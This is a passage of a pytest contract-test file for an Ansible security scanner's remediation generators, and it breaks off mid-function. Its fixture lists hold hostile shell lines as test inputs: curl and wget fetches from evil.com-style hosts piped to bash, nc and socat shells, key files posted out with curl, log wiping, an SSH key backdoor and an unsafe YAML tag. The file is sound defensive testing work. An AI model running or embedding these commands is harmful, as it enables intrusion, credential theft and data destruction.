"""Contract tests for the remediation generators.

Every shipped rule must produce a well-formed, rule-specific remediation
that carries a Secure Fix YAML block - there is no procedural opt-out.
Run with `pytest tests/test_remediations.py`.
"""

from __future__ import annotations

import ast
import re
import sys
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parent.parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from ansible_security_scanner.patterns_manager import known_rule_ids  # noqa: E402
from ansible_security_scanner.remediations import _pattern_index as _PI  # noqa: E402
from ansible_security_scanner.remediations._category_map import resolve_category  # noqa: E402
from ansible_security_scanner.remediations.base import (  # noqa: E402
    BaseRemediationGenerator,
    _finding_artifact,
    _fix_references_artifact,
)
from ansible_security_scanner.remediations.insecure_communication import (  # noqa: E402
    InsecureCommunicationRemediationGenerator,
)
from ansible_security_scanner.remediations.malicious_activity import (  # noqa: E402
    MaliciousActivityRemediationGenerator,
)
from ansible_security_scanner.remediations.operational_security import (  # noqa: E402
    OperationalSecurityRemediationGenerator,
)
from ansible_security_scanner.remediations.privilege_escalation import (  # noqa: E402
    PrivilegeEscalationRemediationGenerator,
)
from ansible_security_scanner.remediations.remediation_generator import (  # noqa: E402
    RemediationGenerator,
)
from ansible_security_scanner.remediations.system_compromise import (  # noqa: E402
    SystemCompromiseRemediationGenerator,
)
from ansible_security_scanner.remediations.template_injection import (  # noqa: E402
    TemplateInjectionRemediationGenerator,
)

PATTERNS_DIR = SRC / "ansible_security_scanner" / "patterns"

# Synthetic credential fixtures shared by the credential-identity tests. The
# UUID is split so secret scanning does not flag a contiguous literal; it is a
# random value, not a real Splunk HEC token. The JWT decodes to a throwaway
# ``{"alg":"HS256"}`` / ``{"sub":"x"}`` with the signature literally ``sig``.
_SYNTHETIC_UUID = "e017639c" + "-db22-4933-936c-2950972a1e5c"
_SYNTHETIC_JWT = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln"


def _collect_rule_ids() -> list[tuple[str, str]]:
    """Return a list of (rule_id, category) tuples from every pattern YAML file."""
    out: list[tuple[str, str]] = []
    for yml in sorted(PATTERNS_DIR.glob("*.yml")):
        data = yaml.safe_load(yml.read_text())
        if not isinstance(data, dict):
            continue
        patterns = data.get("patterns", [])
        for p in patterns:
            rid = p.get("id")
            cat = p.get("category", yml.stem)
            if rid:
                out.append((rid, cat))
    return out


ALL_RULES = _collect_rule_ids()


def _collect_rule_positive_examples() -> list[tuple[str, str, str]]:
    """Return ``(rule_id, category, positive_example)`` triples - one per
    positive example per rule. Rendering a rule's fix against the very
    code it is built to match is the only way to catch extraction bugs
    (truncated/nested Jinja, missing Secure Fix block) that never surface
    against a generic placeholder snippet.
    """
    out: list[tuple[str, str, str]] = []
    for yml in sorted(PATTERNS_DIR.glob("*.yml")):
        data = yaml.safe_load(yml.read_text())
        if not isinstance(data, dict):
            continue
        for p in data.get("patterns", []):
            rid = p.get("id")
            if not rid or p.get("exclude"):
                continue
            cat = p.get("category", yml.stem)
            for ex in p.get("positive_examples") or []:
                if isinstance(ex, str) and ex.strip():
                    out.append((rid, cat, ex))
    return out


ALL_POSITIVE_EXAMPLES = _collect_rule_positive_examples()


# Every rule the scanner can emit, pattern and structural alike. The
# catalog-driven tests above only see rules declared in ``patterns/*.yml``;
# structural rules (emitted from ``file_scanner.py`` / ``taint_tracker.py`` with
# no YAML entry) are covered here instead. ``KNOWN_RULE_IDS`` is the scanner's
# authoritative universe; ``_emitted_rule_id_literals`` derives, from source,
# every rule_id the emit sites construct, so the completeness test fails when a
# new structural rule_id is added without being registered.

KNOWN_RULE_IDS = sorted(known_rule_ids())

_SCANNER_SOURCES = (
    SRC / "ansible_security_scanner" / "file_scanner.py",
    SRC / "ansible_security_scanner" / "taint_tracker.py",
)
# Call sites that construct a finding; the rule_id is either the ``rule_id=``
# keyword or a positional string-literal argument.
_EMIT_CALL_NAMES = frozenset({"_make_finding", "_make_jinja_finding", "emit", "SecurityFinding"})


def _emitted_rule_id_literals() -> set[str]:
    """Return every rule_id string literal the scanner constructs.

    Walks the finding-emitting source with ``ast`` and collects string literals
    passed as ``rule_id=`` or as a positional argument to a known finding
    constructor. Dynamic rule_ids (the regex scanner's ``pattern_obj.id``) come
    from ``patterns/*.yml`` and are already in ``KNOWN_RULE_IDS``, so only
    literals need this static sweep.
    """
    found: set[str] = set()
    for src in _SCANNER_SOURCES:
        tree = ast.parse(src.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            name = getattr(func, "attr", None) or getattr(func, "id", None)
            if name not in _EMIT_CALL_NAMES:
                continue
            for kw in node.keywords:
                if kw.arg == "rule_id" and isinstance(kw.value, ast.Constant):
                    if isinstance(kw.value.value, str):
                        found.add(kw.value.value)
            for arg in node.args:
                # Only identifier-shaped literals, so titles / descriptions in
                # the positional list are not mistaken for rule_ids.
                if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
                    if re.fullmatch(r"[a-z][a-z0-9_]{3,}", arg.value):
                        found.add(arg.value)
    return found


# Structural noise words that appear in almost every task and prove nothing
# about grounding, excluded when checking a fix reuses a distinctive token from
# a command/behaviour finding.
_SNIPPET_STOPWORDS = frozenset(
    {
        "name",
        "shell",
        "command",
        "ansible",
        "builtin",
        "true",
        "false",
        "yes",
        "with",
        "from",
        "this",
        "that",
        "when",
        "vars",
        "task",
        "tasks",
        "value",
        "state",
        "present",
        "absent",
        "path",
        "dest",
        "mode",
        "become",
    }
)
_SNIPPET_TOKEN_RE = re.compile(r"[A-Za-z][A-Za-z0-9_.-]{3,}")


def _distinctive_snippet_tokens(snippet: str) -> set[str]:
    """Return lowercased distinctive tokens from a command/behaviour snippet.

    Used to assert a fix reuses the flagged command (``auditd``, ``arpspoof``,
    ``StrictHostKeyChecking``) when the finding has no structured artifact.
    """
    out: set[str] = set()
    for m in _SNIPPET_TOKEN_RE.finditer(snippet or ""):
        tok = m.group(0).lower().rstrip(".,;:")
        if len(tok) >= 4 and tok not in _SNIPPET_STOPWORDS:
            out.add(tok)
    return out


def _fix_is_grounded(out: str, artifact: str) -> bool:
    """True when ``out`` references ``artifact`` from the finding.

    A Jinja variable ``{{ x }}`` counts as grounded when the bare name appears
    anywhere in the fix, since handlers often rewrite it into ``x`` inside a
    ``register:`` / ``argv`` line.
    """
    if _fix_references_artifact(out, artifact) or artifact in out:
        return True
    jm = re.fullmatch(r"\{\{\s*([a-zA-Z_][\w.]*)\s*\}\}", artifact.strip())
    if jm:
        return re.search(rf"(?<![\w]){re.escape(jm.group(1))}(?![\w])", out) is not None
    return False


_UNRENDERED_PLACEHOLDER_PATTERNS = [
    re.compile(r"\{code_snippet[^a-zA-Z0-9_]"),
    re.compile(r"\{rule_id[^a-zA-Z0-9_]"),
]

# `{ ident }` / `{ ident | filter }`: the symptom of an f-string author
# writing `{{ x }}` where Jinja needs literal `{{ x }}` (i.e. `{{{{ x }}}}`).
_SINGLE_BRACE_JINJA_RE = re.compile(
    r"(?<!\{)\{ [a-zA-Z_][a-zA-Z0-9_.]*(?:\s*\|\s*[^{}]+?)? \}(?!\})"
)

# `{{ key: val }}` around a YAML mapping: copy-paste from an f-string
# body that doubled the braces to escape them. Never valid Jinja.
_DOUBLED_BRACES_AROUND_MAPPING_RE = re.compile(r"\{\{\s*[a-zA-Z_][\w-]*\s*:\s*[^{}\n]+\}\}")

# Substrings that mean a render pipeline failed (template not interpolated,
# Python repr leaked, internal class identifier reached the user).
_RENDER_FAILURE_MARKERS = (
    "_BASELINE_POD_SPEC",
    "{self.",
    "{cls.",
    "<class '",
    "<function ",
)

# Structural-YAML line shapes used to detect runs of YAML that escape
# every fenced block. We deliberately do not match prose bullets like
# `- PyPI: Account Settings`.
_YAML_TOPLEVEL_KEY_RE = re.compile(r"^[a-z_][\w-]*:\s*$")
_YAML_INDENTED_KEY_RE = re.compile(r"^ {2,}[a-z_][\w-]*:\s*\S")
_YAML_LIST_ITEM_RE = re.compile(r"^ {2,}- [a-z_][\w-]*:\s*\S")
_MARKDOWN_BULLET_RE = re.compile(r"^[ ]{0,2}- [A-Z]")

# Triple-fenced blocks; allow up to 4 spaces of leading indent on either
# fence so we also strip the indented fences the MR comment renderer
# emits for inline snippets.
_FENCED_BLOCK_RE = re.compile(r"^[ ]{0,4}```[^\n]*\n.*?\n[ ]{0,4}```", re.DOTALL | re.MULTILINE)

# `{{` that is followed only by optional whitespace/quote until end of line:
# the signature of a Jinja expression whose value was truncated by a greedy
# extractor that stopped at the space inside `{{ var }}` (e.g. `url: "...v{{"`
# or `path: "{{"`). Valid single-line and multi-line Jinja never match this;
# neither do JSON policy docs whose braces close as `...}}`.
_TRUNCATED_JINJA_RE = re.compile(r"\{\{(?=\s*[\"']?\s*$)", re.MULTILINE)

# A `{{ ... }}` expression that itself contains another `{{` before it closes:
# invalid nested Jinja (e.g. `{{ lookup('x', '{{ playbook_dir }}/y') }}`),
# the symptom of an f-string author pasting a literal `{{ var }}` inside an
# already-interpolated expression.
_NESTED_JINJA_RE = re.compile(r"\{\{(?:[^{}]|\}(?!\}))*\{\{")

# A "fill-it-in-yourself" placeholder: a Secure Fix that punts the actual
# remediation back to the operator via a fake variable instead of reusing the
# finding's own code. Real fixes weave in the flagged command/path/host, so
# none of these tokens should appear in a shipped Secure Fix body.
_GENERIC_PLACEHOLDER_RE = re.compile(
    r"\{\{\s*(?:remediation_command|your_command(?:_here)?|command_here|"
    r"insert_command|replace_me|todo)\s*\}\}"
    r"|<\s*(?:your[ _-]command|command[ _-]here|insert[ _-]command|replace[ _-]me)[^>]*>",
    re.IGNORECASE,
)


def _unfenced_yaml_runs(output: str) -> list[list[str]]:
    """Return runs (>= 2 lines) of structural-YAML-shaped lines that
    survive outside every ```...``` block. Single yaml-looking lines
    are tolerated; it's the multi-line blocks that misrender as prose.
    """
    stripped = _FENCED_BLOCK_RE.sub("", output)

    runs: list[list[str]] = []
    current: list[str] = []
    for raw_line in stripped.splitlines():
        if _MARKDOWN_BULLET_RE.match(raw_line):
            # Markdown bullet at column 0 - not YAML even if it has a colon.
            if len(current) >= 2:
                runs.append(current)
            current = []
            continue
        if (
            _YAML_TOPLEVEL_KEY_RE.match(raw_line)
            or _YAML_INDENTED_KEY_RE.match(raw_line)
            or _YAML_LIST_ITEM_RE.match(raw_line)
        ):
            current.append(raw_line)
            continue
        if current and not raw_line.strip():
            # Blank line continues a yaml block.
            current.append(raw_line)
            continue
        if len(current) >= 2:
            runs.append(current)
        current = []
    if len(current) >= 2:
        runs.append(current)
    return runs


def _assert_well_formed(rule_id: str, output: str) -> None:
    assert isinstance(output, str), f"{rule_id}: non-string output"
    assert output.strip(), f"{rule_id}: empty remediation"
    assert len(output) >= 200, (
        f"{rule_id}: remediation too short ({len(output)} chars) - "
        f"per project policy remediations must always have contextual content"
    )
    assert "```" in output, f"{rule_id}: missing code fence in remediation"
    assert output.count("```") % 2 == 0, (
        f"{rule_id}: unbalanced triple-backtick code fences - count={output.count('```')}"
    )
    for pat in _UNRENDERED_PLACEHOLDER_PATTERNS:
        assert not pat.search(output), (
            f"{rule_id}: unrendered f-string placeholder matched {pat.pattern!r}"
        )
    bad = _SINGLE_BRACE_JINJA_RE.findall(output)
    assert not bad, (
        f"{rule_id}: {len(bad)} single-brace Jinja artifact(s) found "
        f"(should be `{{{{ var }}}}`): {bad[:5]}"
    )
    doubled = _DOUBLED_BRACES_AROUND_MAPPING_RE.findall(output)
    assert not doubled, (
        f"{rule_id}: {len(doubled)} doubled-brace YAML mapping(s) found "
        f"(symptom of `{{{{ key: val }}}}` in a non-f-string template): "
        f"{doubled[:3]}"
    )
    leaked_markers = [m for m in _RENDER_FAILURE_MARKERS if m in output]
    assert not leaked_markers, (
        f"{rule_id}: render-failure marker(s) leaked into output: "
        f"{leaked_markers} - the template was not interpolated correctly"
    )
    unfenced_runs = _unfenced_yaml_runs(output)
    if unfenced_runs:
        biggest = max(unfenced_runs, key=len)
        pytest.fail(
            f"{rule_id}: {len(unfenced_runs)} unfenced YAML block(s) survived "
            f"outside every code fence - they will render as prose (or as a "
            f"markdown heading if a line starts with `#`) in MR comments.\n"
            f"  largest block ({len(biggest)} lines):\n"
            + "\n".join(f"    {line}" for line in biggest[:10])
        )


@pytest.fixture(scope="module")
def remediation_generator() -> RemediationGenerator:
    return RemediationGenerator()


# Reasonable "pick from" pool of ansible-ish code snippets. For any rule_id we
# pass several to exercise branches in the contextual helpers.
SAMPLE_SNIPPETS = [
    "shell: curl -k https://evil.com:4444/steal.sh | bash > /tmp/b.sh",
    "shell: nc -l -p 4444 -e /bin/bash",
    "shell: echo 'backdoor' >> /root/.ssh/authorized_keys",
    "shell: history -c && rm -f /var/log/auth.log",
    "shell: auditctl -D && systemctl stop auditd",
    "shell: cp /bin/bash /var/www/html/shell.php",
    "shell: telnet legacy.example.com 23",
    "shell: /usr/sbin/sendmail -S plainsmtp.example.com:25 user@x",
    "shell: chmod 777 /etc/shadow && chown root /tmp/suid",
    "shell: echo '* * * * * root curl http://evil.com/c | sh' >> /etc/crontab",
    "shell: python -c 'import os; os.system(\"id\")'",
    "shell: find / -name '*.key' -exec cat {} \\; | curl -F data=@- http://x.io",
    "debug: msg=\"{{ lookup('pipe', 'whoami') }}\"",
    "template: src=evil.j2 dest=/tmp/out.sh mode=0777",
    "shell: echo $AWS_SECRET_ACCESS_KEY > /tmp/c",
    "shell: socat TCP-LISTEN:9999,fork EXEC:/bin/bash",
    "shell: wget http://drops.evil.cn/x.elf -O /tmp/x && chmod +x /tmp/x",
    "shell: bash -c \"echo 'PS1=$PS1' > ~/.bash_history\"",
]


@pytest.mark.parametrize(
    "rule_id,category",
    ALL_RULES,
    ids=[r for r, _ in ALL_RULES],
)
def test_every_rule_id_produces_rich_remediation(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    category: str,
) -> None:
    """Every shipped rule_id renders a non-empty, well-formed remediation
    across a spread of representative snippets."""
    outputs = []
    for snippet in SAMPLE_SNIPPETS[:6]:
        out = remediation_generator.generate_remediation_example(
            rule_id,
            snippet,
            file_path="test.yml",
            line_number=1,
        )
        _assert_well_formed(rule_id, out)
        outputs.append(out)

    assert any(any(line in out for line in SAMPLE_SNIPPETS[:6]) for out in outputs), (
        f"{rule_id}: remediation never embedded the offending snippet"
    )


_LEGACY_BOILERPLATE_PHRASES = RemediationGenerator._LEGACY_BOILERPLATE
_RELEVANCE_STOPWORDS = RemediationGenerator._STOPWORDS
_TOKEN_RE = RemediationGenerator._TOKEN_RE


def _distinctive_tokens(text: str) -> set[str]:
    return RemediationGenerator._distinctive_tokens(text)


@pytest.mark.parametrize(
    "rule_id,category",
    ALL_RULES,
    ids=[r for r, _ in ALL_RULES],
)
def test_remediation_is_relevant_to_the_rule(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    category: str,
) -> None:
    """Each rule's remediation must mention a distinctive token from its
    own ``title``/``recommendation`` and must not regress to the legacy
    category-level boilerplate."""
    yml = PATTERNS_DIR / f"{category}.yml"
    if yml.exists():
        data = yaml.safe_load(yml.read_text()) or {}
        meta = next((p for p in data.get("patterns", []) if p.get("id") == rule_id), None)
    else:
        meta = None
        for candidate in PATTERNS_DIR.glob("*.yml"):
            data = yaml.safe_load(candidate.read_text()) or {}
            for p in data.get("patterns", []):
                if p.get("id") == rule_id:
                    meta = p
                    break
            if meta:
                break

    assert meta is not None, f"{rule_id}: no pattern metadata found"
    title = meta.get("title") or ""
    recommendation = meta.get("recommendation") or ""

    keywords = _distinctive_tokens(title) | _distinctive_tokens(recommendation)
    if not keywords:
        pytest.skip(f"{rule_id}: rule has no title/recommendation tokens to anchor against")

    snippet = "shell: echo placeholder"
    out = remediation_generator.generate_remediation_example(
        rule_id, snippet, file_path="test.yml", line_number=1
    )
    out_lower = out.lower()

    leaked = [p for p in _LEGACY_BOILERPLATE_PHRASES if p in out]
    assert not leaked, (
        f"{rule_id}: remediation emitted legacy boilerplate phrase {leaked[0]!r} - "
        f"this rule is regressing to the pre-metadata fallback."
    )

    matched = [k for k in keywords if k in out_lower]
    assert matched, (
        f"{rule_id}: remediation does not mention any distinctive token from "
        f"the rule's title/recommendation.\n"
        f"  title: {title!r}\n"
        f"  recommendation excerpt: {recommendation[:160]!r}\n"
        f"  remediation excerpt (first 240 chars): {out[:240]!r}\n"
        f"  expected at least one of (sample): {sorted(keywords)[:8]}"
    )


# A Secure Fix block: a ``✅ ...:`` label followed, within a few prose lines, by
# a fenced code block. Ansible fixes are YAML, but some rules remediate in the
# fix's native language: jinja2 template rules emit ```jinja, vault-config rules
# emit ```ini for ansible.cfg, EE rules emit ```dockerfile, and a few emit
# shell. All are accepted; callers still validate the body for broken Jinja and
# placeholders.
_SECURE_FIX_LANGS = "(?:ya?ml|jinja2?|ini|dockerfile|toml|bash|sh|cfg)"
_SECURE_FIX_BLOCK_RE = re.compile(
    r"\*\*\u2705[^*\n]+:\*\*\s*\n(?:[^\n]*\n){0,3}```"
    + _SECURE_FIX_LANGS
    + r"?\n(?P<body>.*?)\n```",
    re.MULTILINE | re.DOTALL,
)


def _companion_fix_hint(rule_id: str, category: str, companion_path) -> str:
    return (
        f"  Add a `secure_fix:` entry for `{rule_id}` in {companion_path},\n"
        f"  or implement a tailored handler in remediations/{category}.py.\n"
        f"  Every finding must ship an actionable Ansible fix - there is no\n"
        f"  procedural opt-out."
    )


@pytest.mark.parametrize(
    "rule_id,category",
    ALL_RULES,
    ids=[r for r, _ in ALL_RULES],
)
def test_remediation_includes_secure_fix_yaml_block(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    category: str,
) -> None:
    """Every rule must render a curated ``✅ Secure Fix`` YAML block.

    Per project policy every finding ships an actionable Ansible fix - there
    is no procedural opt-out. ``negative_examples`` are regex non-match
    fixtures and are explicitly not accepted as a fix source.
    """
    meta = _PI.get(rule_id)

    out = remediation_generator.generate_remediation_example(
        rule_id, "shell: echo placeholder", file_path="test.yml", line_number=1
    )

    yml_path = PATTERNS_DIR / f"{category}.yml"
    if not yml_path.exists():
        for candidate in PATTERNS_DIR.glob("*.yml"):
            data = yaml.safe_load(candidate.read_text()) or {}
            if any(p.get("id") == rule_id for p in data.get("patterns", [])):
                yml_path = candidate
                break

    companion_path = (
        PATTERNS_DIR / "remediations" / (yml_path.name if yml_path else f"{category}.yml")
    )
    fix_hint = _companion_fix_hint(rule_id, category, companion_path)

    match = _SECURE_FIX_BLOCK_RE.search(out)
    if not match:
        pytest.fail(
            f"{rule_id}: remediation has no `\u2705 Secure Fix` YAML block.\n"
            f"{fix_hint}\n"
            f"\n  Remediation excerpt (first 320 chars):\n    {out[:320]!r}"
        )

    rendered_body = match.group("body").strip()
    negative_bodies = {
        ex.rstrip("\n").strip()
        for ex in (meta.get("negative_examples") or [])
        if isinstance(ex, str)
    }
    if rendered_body in negative_bodies:
        pytest.fail(
            f"{rule_id}: rendered Secure Fix YAML matches a "
            f"`negative_examples` fixture verbatim. Negative examples are "
            f"regex non-match fixtures, not curated remediation Ansible.\n"
            f"{fix_hint}\n"
            f"\n  rendered body (first 320 chars):\n    {rendered_body[:320]!r}"
        )


def test_no_rule_opts_out_of_remediation() -> None:
    """Policy guard: no shipped rule may carry ``no_ansible_remediation``.

    The flag was the escape hatch that let prose-only rules skip the Secure
    Fix contract. Project policy is now that *every* finding ships an
    actionable Ansible fix, so the flag must not reappear - reintroducing it
    silently re-opens the gap this suite exists to close.
    """
    flagged: list[str] = []
    for yml in sorted(PATTERNS_DIR.glob("*.yml")):
        data = yaml.safe_load(yml.read_text())
        if not isinstance(data, dict):
            continue
        for p in data.get("patterns", []):
            if p.get("exclude"):
                continue
            if p.get("no_ansible_remediation"):
                flagged.append(f"{p.get('id')} ({yml.name})")
    assert not flagged, (
        f"{len(flagged)} rule(s) still set `no_ansible_remediation: true`, "
        f"which is no longer permitted - every finding must ship a dynamic "
        f"Ansible fix instead:\n  " + "\n  ".join(flagged[:20])
    )


@pytest.mark.parametrize(
    "rule_id,category,positive_example",
    ALL_POSITIVE_EXAMPLES,
    ids=[f"{r}#{i}" for i, (r, _, _) in enumerate(ALL_POSITIVE_EXAMPLES)],
)
def test_positive_example_renders_valid_secure_fix(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    category: str,
    positive_example: str,
) -> None:
    """Render every rule against the *actual* code it is built to flag.

    This is the regression net for the whole class of bug where a fix looks
    fine against a generic placeholder snippet but breaks on a real match -
    a greedy extractor truncating ``{{ var }}`` to ``{{``, a nested Jinja
    expression, or the fix dispatch silently dropping to a prose-only
    metadata stub. The generic-snippet tests above never exercise the
    rule's own extraction path; this one does.
    """
    out = remediation_generator.generate_remediation_example(
        rule_id, positive_example, file_path="test.yml", line_number=1
    )
    _assert_well_formed(rule_id, out)

    match = _SECURE_FIX_BLOCK_RE.search(out)
    assert match, (
        f"{rule_id}: rendering against its own positive example produced no "
        f"`\u2705 Secure Fix` YAML block - the fix dispatch fell through to a "
        f"prose-only stub for real matching code.\n"
        f"  positive example (first 160 chars): {positive_example[:160]!r}\n"
        f"  remediation excerpt (first 320 chars): {out[:320]!r}"
    )

    body = match.group("body")
    assert not _TRUNCATED_JINJA_RE.search(body), (
        f"{rule_id}: Secure Fix rendered from the rule's own positive example "
        f"contains a truncated Jinja expression (a dangling `{{{{`). The value "
        f"extractor stopped at the space inside `{{{{ var }}}}`.\n"
        f"  positive example: {positive_example[:160]!r}\n"
        f"  Secure Fix body (first 320 chars): {body[:320]!r}"
    )
    assert not _NESTED_JINJA_RE.search(body), (
        f"{rule_id}: Secure Fix rendered from the rule's own positive example "
        f"contains nested Jinja (`{{{{ ... {{{{ ... }}}} ... }}}}`).\n"
        f"  positive example: {positive_example[:160]!r}\n"
        f"  Secure Fix body (first 320 chars): {body[:320]!r}"
    )
    ph = _GENERIC_PLACEHOLDER_RE.search(body)
    assert not ph, (
        f"{rule_id}: Secure Fix rendered from the rule's own positive example "
        f"contains a fill-it-in-yourself placeholder ({ph.group(0)!r}). The fix "
        f"must reuse the flagged code (command/path/host/target), not punt the "
        f"remediation back to the operator via a fake variable.\n"
        f"  positive example: {positive_example[:160]!r}\n"
        f"  Secure Fix body (first 320 chars): {body[:320]!r}"
    )


@pytest.mark.parametrize(
    "rule_id,category,positive_example",
    ALL_POSITIVE_EXAMPLES,
    ids=[f"{r}#{i}" for i, (r, _, _) in enumerate(ALL_POSITIVE_EXAMPLES)],
)
def test_secure_fix_is_grounded_in_the_finding(
    remediation_generator: RemediationGenerator,
    rule_id: str,
    category: str,
    positive_example: str,
) -> None:
    """Every fix must reference the finding's own concrete artifact.

    Guards against a fix that reads plausibly but ignores the line it was
    attached to (e.g. an ``ansible.cfg`` ``ini_file`` snippet rendered for an
    ``ansible_ssh_common_args`` inventory finding). When the positive example
    names a concrete artifact (URL, path, IP, Jinja variable, dotted host, or
    the flagged inventory/config key) the rendered remediation must echo it back.

    Examples carrying nothing concrete (a bare ``shell: echo x``) are skipped:
    there is no artifact to demand.
    """
    artifact = _finding_artifact(positive_example)
    if not artifact:
        pytest.skip("positive example carries no concrete artifact to ground on")

    out = remediation_generator.generate_remediation_example(
        rule_id, positive_example, file_path="inventory/group_vars/all.yml", line_number=1
    )

    assert _fix_is_grounded(out, artifact), (
        f"{rule_id}: the rendered remediation never references the finding's own "
        f"artifact {artifact!r}. The fix reads as a disconnected/generic example "
        f"rather than a fix for the flagged line.\n"
        f"  positive example: {positive_example[:160]!r}\n"
        f"  remediation excerpt (first 400 chars): {out[:400]!r}"
    )


def test_every_owned_rule_routes_to_a_sound_relevant_handler(
    remediation_generator: RemediationGenerator,
) -> None:
    """Every rule with a tailored handler must reach it soundly.

    ``RemediationGenerator`` builds a ``rule_id -> owning generator`` index from
    each generator's ``_FIX_MAP``. This asserts the index is complete and that
    dispatch through it produces a relevant, well-formed fix for every owned
    rule, catching the bug where a rule's category pointed at the wrong
    generator (so its real handler was unreachable and a foreign fix, e.g.
    'Unsafe File Permissions' for an SSH trust-bypass finding, was emitted).
    """
    gen = remediation_generator
    offenders: list[str] = []
    for rule_id in sorted(gen._rule_owner):
        examples = [ex for (rid, _cat, ex) in ALL_POSITIVE_EXAMPLES if rid == rule_id]
        snippet = examples[0] if examples else "shell: echo placeholder"
        out = gen.generate_remediation_example(
            rule_id, snippet, file_path="test.yml", line_number=1
        )
        if not gen._is_relevant(rule_id, snippet, out):
            offenders.append(f"{rule_id}: dispatched fix is not relevant to the rule")
        elif not _SECURE_FIX_BLOCK_RE.search(out):
            offenders.append(f"{rule_id}: dispatched fix has no Secure Fix block")

    assert not offenders, (
        f"{len(offenders)} owned rule(s) route to an irrelevant or malformed "
        f"handler (likely a stale category mapping shadowing the real handler):\n  "
        + "\n  ".join(offenders[:30])
    )


def test_known_rule_id_registry_is_complete() -> None:
    """No finding-emitting call may construct a rule_id outside the registry.

    ``patterns_manager.known_rule_ids()`` is the scanner's authoritative rule
    universe (--select / --ignore / --list-rules resolve against it, and the
    coverage test below iterates it). Structural rules are emitted as string
    literals in ``file_scanner.py`` / ``taint_tracker.py``; if a new one is
    added without registering it (a pattern YAML entry,
    ``synthetic_rule_frameworks`` membership, or ``_CODE_EMITTED_RULE_IDS``) it
    would escape the registry and every remediation contract test. This static
    sweep fails when that happens.
    """
    emitted = _emitted_rule_id_literals()
    unregistered = sorted(emitted - set(KNOWN_RULE_IDS))
    assert not unregistered, (
        f"{len(unregistered)} rule_id(s) are emitted by the scanner but are not "
        f"in patterns_manager.known_rule_ids(). Register each one (add a "
        f"patterns/*.yml entry, or add it to synthetic_rule_frameworks / "
        f"_CODE_EMITTED_RULE_IDS) so it is covered by --select/--ignore, "
        f"--list-rules, and the remediation contract tests:\n  " + "\n  ".join(unregistered)
    )


# Scan-meta rules report on the scan itself (a suppression directive about the
# scanner, or a parse error) rather than on Ansible code, so they intentionally
# carry a fixed advisory string instead of a Secure Fix YAML block.
_SCAN_META_RULES = frozenset(
    {
        "scan_error",
        "suspicious_suppression",
        "unknown_suppression_rule",
        "excessive_suppressions",
    }
)


# Realistic snippets for structural (code-only) rules so the universal coverage
# test below can render each against code it actually fires on rather than a
# bare placeholder. A rule absent here still gets the placeholder snippet; this
# map only sharpens the check for rules whose fix needs real task context.
# Synthetic values only, never real inventory data.
_STRUCTURAL_SNIPPETS: dict[str, str] = {
    "get_url_dest_executable_with_insecure_validate": (
        '- name: fetch tool\n  get_url:\n    url: "https://example.test/tool"\n'
        '    dest: "/usr/local/bin/tool"\n    validate_certs: no'
    ),
    "become_user_without_become_true": (
        "- name: run as svc\n  ansible.builtin.command: /usr/bin/app\n  become_user: svc_account"
    ),
    "no_log_explicitly_false_on_credential_task_ast": (
        '- name: login\n  uri:\n    url: "https://example.test/auth"\n'
        '    password: "{{ svc_password }}"\n  no_log: false'
    ),
    "cron_job_with_secret_in_argv": (
        "- name: schedule\n  ansible.builtin.cron:\n    name: sync\n"
        '    job: "/usr/bin/sync --token {{ api_token }}"'
    ),
    "docker_host_mount": (
        "- name: run\n  community.docker.docker_container:\n    name: c\n"
        '    volumes:\n      - "/var/run/docker.sock:/var/run/docker.sock"'
    ),
    "world_readable_sensitive": (
        '- name: write cfg\n  copy:\n    dest: "/etc/app/secret.conf"\n    mode: "0644"'
    ),
    "connection_local_shell": (
        '- name: local\n  connection: local\n  ansible.builtin.shell: "echo {{ payload }}"'
    ),
    "include_role_from_url": (
        '- name: pull role\n  include_role:\n    name: "{{ item }}"\n'
        '  vars:\n    src: "https://example.test/role.tar.gz"'
    ),
    "set_fact_injection": (
        "- name: build fact\n  set_fact:\n    resolved_target: \"{{ lookup('pipe', untrusted_input) }}\""
    ),
    # Pattern rules whose catalog positive_example is too terse to ground on
    # (tokens under the distinctive-length threshold). A realistic snippet lets
    # the universal test enforce dynamism on them too.
    "aws_s3_data_access": (
        '- name: exfil\n  ansible.builtin.shell: "aws s3 cp s3://prod-secrets/creds.env /tmp/creds.env"'
    ),
    "aws_s3_list_or_delete": (
        '- name: enumerate\n  ansible.builtin.shell: "aws s3 ls s3://prod-backups/"'
    ),
    "backdoor_listener": ('- name: listen\n  ansible.builtin.shell: "ncat -l -e /bin/bash 4444"'),
    "env_var_constructed_command": (
        '- name: obfuscated\n  ansible.builtin.shell: "$PAYLOAD_A$PAYLOAD_B | bash"'
    ),
    # Split so the file never contains a contiguous Mailchimp-format token
    # (GitHub push protection flags it); the runtime value is a synthetic key.
    "mailchimp_api_key": ('mailchimp_key: "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d' + '-us14"'),
    "recursive_delete_critical": ('- name: cleanup\n  ansible.builtin.shell: "rm -rf /etc/nginx"'),
    "ssh_socks_proxy": ('- name: tunnel\n  ansible.builtin.shell: "ssh -D 1080 jumphost.internal"'),
    "yaml_unsafe_tag_generic": ('validator: !!python/object/apply:os.system ["id"]'),
}


@pytest.mark.parametrize("rule_id", KNOWN_RULE_IDS)
def test_every_known_rule_renders_a_sound_fix(
    remediation_generator: RemediationGenerator,
    rule_id: str,
) -> None:
    """Universal coverage: every rule the scanner can emit ships a sound fix.

    Iterates the scanner's own ``known_rule_ids()`` universe, pattern rules and
    structural code-only rules alike, so no finding type can escape the
    remediation contract by living in Python instead of pattern YAML. Each rule
    must render a well-formed Secure Fix (present, valid fence language, no
    broken Jinja, no fill-it-in placeholder) that is relevant to the rule.

    Scan-meta rules (``scan_error`` and the suppression auditors) report on the
    scan itself, not on Ansible code, so they carry a fixed advisory
    remediation rather than a Secure Fix block and are exempted.
    """
    if rule_id in _SCAN_META_RULES:
        pytest.skip("scan-meta rule: reports on the scan, carries no Ansible Secure Fix")

    snippet = _STRUCTURAL_SNIPPETS.get(rule_id)
    if snippet is None:
